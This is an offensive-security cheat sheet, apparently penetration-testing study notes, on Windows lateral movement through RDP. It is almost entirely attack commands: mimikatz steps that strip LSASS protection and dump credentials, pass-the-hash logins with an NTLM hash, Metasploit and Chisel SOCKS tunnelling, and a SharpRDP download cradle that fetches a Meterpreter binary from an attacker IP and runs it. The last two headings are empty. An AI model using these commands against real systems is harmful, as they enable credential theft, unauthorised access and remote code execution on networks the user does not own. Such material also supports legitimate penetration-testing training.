# Windows Lateral Movement
## Remote Desktop Protocol
### Lateral Movement with RDP

* Disconnecting an RDP session leaves the credentials in memory (Useful in you have admin). If you compromise a well used server you can dump those credentials as well. 

```bash
privilege::debug
# Disable LSA Protection
!+
!processprotect /process:lsass.exe /remove
# Dump credentials
sekurlsa::logonpasswords
```
| Info | Command |
|:-----|:--------|
| Restricted Admin Mode (Uses your existing session doesn't prompt for a password to login) | `mstsc.exe /restrictedadmin` |
| Restricted Admin Mode from Mimikatz (Uses a password hash) | `sekurlsa::pth /user:admin /domain:corp1 /ntlm:2892D26CDF84D7A70E2EB3B9F05C425E /run:"mstsc.exe /restrictedadmin"` |
| Disable Restricted Admin mode | `Remove-ItemProperty -Path "HKLM:\System\CurrentControlSet\Control\Lsa" -Name DisableRestrictedAdmin` |
| Launch PowerShell with NTLM Hash | `sekurlsa::pth /user:admin /domain:corp1 /ntlm:2892D26CDF84D7A70E2EB3B9F05C425E /run:powershell` |
| Create Remote session in PowerShell | `Enter-PSSession -Computer appsrv01` |
| Enabled Restricted Admin mode | `New-ItemProperty -Path "HKLM:\System\CurrentControlSet\Control\Lsa" -Name DisableRestrictedAdmin -Value 0` |
| Remote Desktop from Linux with NTLM hash | `xfreerdp /u:admin /pth:2892D26CDF84D7A70E2EB3B9F05C425E /v:$ip /cert-ignore` |

### Reverse RDP Proxying with Metasploit
| Info | Command |
|:-----|:--------|
| With Background Meterpreter session  load module | `use multi/manage/autoroute` |
| Set the session | `set session 1` |
| Run the exploit | `exploit` |
| Start SOCKS proxy | `use auxiliary/server/socks4a` |
| Set options | `set srvhost 127.0.0.1` |
| Run exploit as background job | `exploit -j` |
| Configuring Proxychains for reverse tunnel | `sudo bash -c 'echo "socks4 127.0.0.1 1080" >> /etc/proxychains.conf'` |
| Run remote desktop with proxychains | `proxychains rdesktop $ip` |

### Reverse RDP Proxying with Chisel
| Info | Command |
|:-----|:--------|
| Install Golang a Chisel requirement | `sudo apt install golang` |
| Clone Chisel from Github | `git clone https://github.com/jpillora/chisel.git` |
| Change to Chisel directory | `cd chisel/` | 
| Compile Chisel for linux | `go build` |
| Compile Chisel for Windows | `env GOOS=windows GOARCH=amd64 go build -o chisel.exe -ldflags "-s -w"` |
| Start Chisel in server mode on Kali | `./chisel server -p 8080 --socks5` | 
| Enable SSH Password authentication on Kali | `sudo sed -i 's/#PasswordAuthentication yes/PasswordAuthentication yes/g' /etc/ssh/sshd_config` |
| Restrat the SSH service | `sudo systemctl start ssh.service` |
| SSH with -N for no commands & -D to configure SOCKS proxy | `ssh -N -D 0.0.0.0:1080 localhost` |
| Configure Windows Client | `chisel.exe client $lhost:8080 socks` |
| Run remote desktop with proxychains | `sudo proxychains rdesktop $ip` |

### RDP as a Console
| Info | Command |
|:-----|:--------|
| SharpRDP Basic command | `SharpRDP.exe computername=appsrv01 command=notepad username=corp1\dave password=lab` |
| SharpRDP Download cradle | `sharprdp.exe computername=appsrv01 command="powershell (New-Object System.Net.WebClient).DownloadFile('http://192.168.119.120/met.exe', 'C:\Windows\Tasks\met.exe'); C:\Windows\Tasks\met.exe" username=corp1\dave password=lab` |

### Stealing Clear Text Credentials from RDP

## Fileless Lateral Movement

